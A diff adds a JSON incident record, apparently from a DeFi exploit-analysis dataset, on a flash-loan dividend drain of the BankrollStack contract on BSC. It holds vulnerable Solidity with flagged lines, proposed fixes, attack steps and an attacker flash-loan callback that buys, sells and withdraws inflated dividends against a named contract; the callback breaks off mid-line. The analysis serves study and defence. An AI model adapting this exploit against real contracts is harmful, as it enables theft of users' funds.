@@ -1,0 +1,35 @@
+{
+ "id": "2025__2025-06-14_BankrollStack_FlashLoanDividendDrain",
+ "source_file": "2025/2025-06-14_BankrollStack_FlashLoanDividendDrain.md",
+ "title": "BankrollStack — Flash Loan Dividend Drain Analysis",
+ "date": "2025-06-14",
+ "protocol": "BankrollStack",
+ "chain": "BSC",
+ "loss_raw": "~5,000 USD",
+ "loss_usd": null,
+ "root_cause": "Logic flaw in dividend calculation within the buy → sell → withdraw flow where the baseline is immediately finalized",
+ "attack_tx": "0x0706425b",
+ "vulnerable_contract": "0x16d0a151297a0393915239373897bCc955882110",
+ "classes": [
+  "flash-loan"
+ ],
+ "code_before": [
+  "❌ Vulnerable logic: dividend baseline (payoutsTo) is not immediately finalized at buy time\nfunction buy(uint256 tokenAmount) external returns (uint256) {\n    // Mints internal tokens from deposited tokens\n    // If profitPerShare is already elevated due to prior donors,\n    // the new buyer can retroactively receive past dividends\n    uint256 tokens = tokenAmountToTokens(tokenAmount);\n    balanceOf[msg.sender] += tokens;\n    // payoutsTo is not immediately updated based on the current profitPerShare\n}\n\n//",
+  "// buy() — Etherscan-verified verbatim (delegates to buyFor)\nfunction buy(uint buy_amount) public returns (uint256)  {\n    return buyFor(msg.sender, buy_amount);\n}\n\n// buyFor() / purchaseTokens() — Etherscan-verified verbatim (core buy logic)\nfunction buyFor(address _customerAddress, uint buy_amount) public returns (uint256)  {\n    require(token.transferFrom(msg.sender, address(this), buy_amount));\n    totalDeposits += buy_amount;\n    uint amount = purchaseTokens(_customerAddress, buy_amount);\n    emit onLeaderBoard(_customerAddress,\n        stats[_customerAddress].invested,\n        tokenBalanceLedger_[_customerAddress],\n        stats[_customerAddress].withdrawn,\n        now\n    );\n    distribute();\n    return amount;\n}\n\nfunction purchaseTokens(address _customerAddress, uint256 _incomingeth) internal returns (uint256) {\n    if (stats[_customerAddress].invested == 0 && stats[_customerAddress].receivedTokens == 0) {\n        players += 1;\n    }\n    totalTxs += 1;\n    uint256 _undividedDividends = SafeMath.mul(_incomingeth, entryFee_) / 100;\n    uint256 _amountOfTokens = SafeMath.sub(_incomingeth, _undividedDividends);\n    emit onTokenPurchase(_customerAddress, _incomingeth, _amountOfTokens, now);\n    require(_amountOfTokens > 0 && SafeMath.add(_amountOfTokens, tokenSupply_) > tokenSupply_);\n    if (tokenSupply_ > 0) {\n        tokenSupply_ += _amountOfTokens;\n    } else {\n        tokenSupply_ = _amountOfTokens;\n    }\n    allocateFees(_undividedDividends);\n    tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n    // ❌ payoutsTo_ set based on current profitPerShare_ — does not block retroactive dividend claims\n    // after a sell(), the accounting delta between entry and exit creates a positive dividendsOf()\n    int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens);\n    payoutsTo_[_customerAddress] += _updatedPayouts;\n    stats[_customerAddress].invested += _incomingeth;\n    stats[_customerAddress].xInvested += 1;\n    return _amountOfTokens;\n}\n\n// sell() — Etherscan-verified verbatim\nfunction sell(uint256 _amountOfTokens) onlyBagholders public {\n    address _customerAddress = msg.sender;\n    require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\n    uint256 _undividedDividends = SafeMath.mul(_amountOfTokens, exitFee_) / 100;\n    uint256 _taxedeth = SafeMath.sub(_amountOfTokens, _undividedDividends);\n    tokenSupply_ = SafeMath.sub(tokenSupply_, _amountOfTokens);\n    tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n    // ❌ payoutsTo_ reduction releases accumulated dividend credit — exploitable via buy→sell cycle\n    int256 _updatedPayouts = (int256) (profitPerShare_ * _amountOfTokens + (_taxedeth * magnitude));\n    payoutsTo_[_customerAddress] -= _updatedPayouts;\n    allocateFees(_undividedDividends);\n    emit onTokenSell(_customerAddress, _amountOfTokens, _taxedeth, now);\n    distribute();\n}\n\n// dividends"
+ ],
+ "code_after": [
+  "✅ Fix: immediately finalize payoutsTo based on current profitPerShare at buy time\nfunction buy(uint256 tokenAmount) external returns (uint256) {\n    uint256 tokens = tokenAmountToTokens(tokenAmount);\n    balanceOf[msg.sender] += tokens;\n    // Set baseline so new entrants only receive dividends from this point forward\n    payoutsTo[msg.sender] += (int256)(profitPerShare * tokens);\n}",
+  "// ✅ Fix: enforce a minimum holding period to block same-block buy/sell\nmapping(address => uint256) public lastBuyBlock;\n\nfunction buy(uint256 tokenAmount) external returns (uint256) {\n    lastBuyBlock[msg.sender] = block.number;  // ✅ record buy block\n    // ... existing logic ...\n}\n\nfunction sell(uint256 tokenAmount) external {\n    require(block.number > lastBuyBlock[msg.sender], \"same-block sell disallowed\");  // ✅\n    // ... existing logic ...\n}"
+ ],
+ "steps": [
+  "1 ▶ PancakeSwap V3 Pool: flash(28,300 BUSD)",
+  "2 ▶ BankrollStack.buy(28,300 BUSD)",
+  "3 ▶ BankrollStack.sell(myTokens())",
+  "4 ▶ BankrollStack.withdraw()",
+  "5 ▶ PancakeSwap V3 Pool: repay(28,302.83 BUSD) + retain profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─1─▶ PancakeSwap V3 Pool: flash(28,300 BUSD)\n  │         [pancakeV3FlashCallback callback]\n  │\n  ├─2─▶ BankrollStack.buy(28,300 BUSD)\n  │         └─ Acquire internal tokens (dividend baseline not finalized)\n  │\n  ├─3─▶ BankrollStack.sell(myTokens())\n  │         └─ Sell all internal tokens + accumulate dividends\n  │\n  ├─4─▶ BankrollStack.withdraw()\n  │         └─ Collect inflated dividends\n  │\n  └─5─▶ PancakeSwap V3 Pool: repay(28,302.83 BUSD) + retain profit",
+  "function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n    uint256 buyAmount = IERC20(BUSD).balanceOf(address(this)); // 28,300 BUSD\n    uint256 repayAmount = 28302830000000000000000; // principal + fee\n\n    // Approve BankrollStack for full amount\n    IERC20(BUSD).approve(address(BankrollStack), type(uint256).max);\n\n    // Buy with full amount — triggers dividend baseline vulnerability\n    IBankrollStack(BankrollStack).buy(buyAmount);\n\n    // Sell all internal tokens\n    uint256 myTokens = IBankrollStack(BankrollStack).myTokens();\n    IBankrollStack(BankrollStack).sell(myTokens);\n\n    // Collect inflated dividends (returns more BUSD than principal)\n    IBankrollStack(BankrollStack).withdraw();\n\n    // Repay flash loan\n    IERC20(BUSD).transfer(address("
+ ]
+}
